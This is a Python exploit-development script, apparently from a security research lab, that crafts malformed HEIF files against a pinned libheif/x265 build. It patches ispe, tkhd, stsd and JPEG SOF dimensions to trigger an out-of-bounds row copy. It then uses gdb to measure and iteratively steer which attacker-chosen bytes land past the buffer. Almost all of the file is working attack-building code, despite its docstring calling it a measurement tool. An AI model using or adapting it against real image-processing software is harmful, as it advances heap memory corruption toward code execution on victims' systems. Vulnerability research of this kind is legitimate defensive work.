#!/usr/bin/env python3
"""W177: measure the byte granularity of file-derived OOB bytes on the pinned
plain Release v1.23.6 decoder -> x265 padding path.

Modes (all use a genuine 64x72 frame-1 JPEG whose last block row (rows 64..71)
is encoded source data; container metadata is patched to 512x64 as in
make_controlled_row.py, so frame 1 decodes 64x72 stride 64 and the padding call
copies row 64 past the 32783-byte replacement plane):

  uniform T                 all 64 pixels of each last-row block = T. The
                            observed OOB row should be T repeated 64 times.
  blocks T0 .. T7           block i (columns 8i..8i+7) = Ti. Eight independent
                            block values; the observed row should be Ti x8.
  precomp T0 .. T7 [gain]   try to force eight *individual* bytes at columns
                            24..31 through iterative source pre-compensation;
                            rebuilds the HEIF and reads the real source row at
                            the OOB memcpy each iteration.

Only the first OOB row is measured, through the committed gdb_controlled.cmd.
This is a measurement tool, not an exploit: right-edge fill, allocator state
and lifetime choices stay as in the committed W166/W171 probes.

Usage (from repo root):
  python3 .../measure_byte_granularity.py uniform EVIDENCE_DIR 80
  python3 .../measure_byte_granularity.py blocks EVIDENCE_DIR 11 22 33 44 55 66 77 88
  python3 .../measure_byte_granularity.py precomp EVIDENCE_DIR de ad be ef 41 42 43 44 1.0

HEIF_ENC, DRIVER and GDB_CMD override the pinned lab paths.
"""
import hashlib
import importlib.util
import os
import re
import struct
import subprocess
import sys
from pathlib import Path
from PIL import Image

ROOT = Path(__file__).resolve().parents[5]
NEIGHBOUR = Path(__file__).resolve().parent
ENC = os.environ.get('HEIF_ENC', '/tmp/libheif2shell-vuln-plain/examples/heif-enc')
DRIVER = os.environ.get('DRIVER', '/tmp/libheif2shell-reencode-retain')
GDB_CMD = Path(os.environ.get('GDB_CMD', str(NEIGHBOUR / 'gdb_controlled.cmd')))
H, W, ROW = 72, 64, 64

spec = importlib.util.spec_from_file_location('mcr', NEIGHBOUR / 'make_controlled_row.py')
mcr = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mcr)


def build_heif(src_row: list, out: Path) -> Path:
    """src_row is the 64-byte source value for decoded rows 64..71."""
    out.mkdir(parents=True, exist_ok=True)
    for idx in (1, 2):
        im = Image.new('L', (W, H))
        px = im.load()
        for y in range(H):
            for x in range(W):
                if idx == 2 and ROW <= y < ROW + 8:
                    px[x, y] = src_row[x]
                else:
                    px[x, y] = 20 + ((x * 13 + y * 7 + idx * 40) % 180)
        im.save(out / f'controlled_{idx}.jpg', 'JPEG', quality=100, subsampling=0)

    ref = out / 'reference.heif'
    subprocess.run([ENC, '-S', '--jpeg', str(out / 'controlled_1.jpg'),
                    str(out / 'controlled_2.jpg'), '-o', str(ref)],
                   check=True, capture_output=True)
    data = bytearray(ref.read_bytes())
    for ispe in mcr.find_boxes(data, 0, len(data), b'ispe'):
        struct.pack_into('>I', data, ispe + 12, 512)
        struct.pack_into('>I', data, ispe + 16, 64)
    for tkhd in mcr.find_boxes(data, 0, len(data), b'tkhd'):
        struct.pack_into('>I', data, tkhd + 84, 512 << 16)
        struct.pack_into('>I', data, tkhd + 88, 64 << 16)
    stsd = mcr.find_boxes(data, 0, len(data), b'stsd')[0]
    entry = data.find(struct.pack('>HH', W, H), stsd, stsd + 118)
    if entry < 0:
        raise SystemExit(f'sample entry {W}x{H} not found')
    struct.pack_into('>HH', data, entry, 512, 64)
    mdat = mcr.find_boxes(data, 0, len(data), b'mdat')[-1]
    payload = mdat + 8
    sample = (len(data) - payload) // 2
    sof = data.find(b'\xff\xc0', payload, payload + sample)
    if sof < 0:
        raise SystemExit('no SOF in first sample')
    struct.pack_into('>HH', data, sof + 5, W, 512)
    heif = out / 'attack.heif'
    heif.write_bytes(data)
    return heif


def measure(heif: Path, out: Path, tag: str, src_row: list) -> tuple:
    cmd = out / f'gdb-{tag}.cmd'
    cmd.write_text(GDB_CMD.read_text().replace(
        'lab/frontier/libheif2shell/real/neighbour/controlled-size.heif', str(heif)))
    p = subprocess.run(['gdb', '-q', '-batch', '-x', str(cmd), DRIVER],
                       cwd=ROOT, capture_output=True, text=True, timeout=60)
    text = p.stdout + p.stderr
    (out / f'{tag}-gdb.out').write_text(text)
    lines = re.findall(r'^0x[0-9a-f]+:\s+((?:0x[0-9a-f]{2}\s+){7}0x[0-9a-f]{2})\s*$',
                       text, re.M)
    # The first eight byte-lines are the x/64bx $rsi dump after the OOB marker.
    start = text.find('OOB dest_off=')
    if start < 0:
        raise SystemExit(f'{tag}: no OOB marker\n{text[-1500:]}')
    tail = text[start:]
    lines = re.findall(r'^0x[0-9a-f]+:\s+((?:0x[0-9a-f]{2}\s+){7}0x[0-9a-f]{2})\s*$',
                       tail, re.M)
    if len(lines) < 8:
        raise SystemExit(f'{tag}: OOB source dump incomplete\n{tail[-1500:]}')
    got = bytes(int(v, 16) for line in lines[:8] for v in line.split())
    digest = hashlib.sha256(heif.read_bytes()).hexdigest()
    print(f'{tag} src={bytes(src_row).hex()} got={got.hex()} '
          f'bytes={heif.stat().st_size} sha256={digest}', flush=True)
    return list(got), digest


def main() -> None:
    mode = sys.argv[1]
    out = Path(sys.argv[2])
    out.mkdir(parents=True, exist_ok=True)
    target = [int(x, 16) for x in sys.argv[3:11]]

    if mode == 'uniform':
        val = target[0]
        src = [val] * W
        heif = build_heif(src, out / 'uniform')
        got, digest = measure(heif, out, 'uniform', src)
        print(f'EXACT={got == src} target={val:02x}*64')
        return

    if len(target) != 8:
        raise SystemExit('eight hex target bytes required')

    if mode == 'blocks':
        src = [target[x // 8] for x in range(W)]
        heif = build_heif(src, out / 'blocks')
        got, digest = measure(heif, out, 'blocks', src)
        print(f'EXACT={got == src} target={"".join(f"{t:02x}" for t in target)}')
        return

    if mode == 'precomp':
        gain = float(sys.argv[11]) if len(sys.argv) > 11 else 1.0
        src = [0x40] * W
        for it in range(20):
            heif = build_heif(src, out / f'it{it:02d}')
            got, digest = measure(heif, out, f'it{it:02d}', src)
            current = got[24:32]
            if current == target:
                print(f'CONVERGED src24..31={bytes(src[24:32]).hex()}')
                return
            for i, t in enumerate(target):
                src[24 + i] = max(0, min(255, round(src[24 + i] + gain * (t - current[i]))))
        print(f'NO CONVERGENCE target={"".join(f"{t:02x}" for t in target)}')
        return

    raise SystemExit('mode must be uniform, blocks or precomp')


if __name__ == '__main__':
    main()
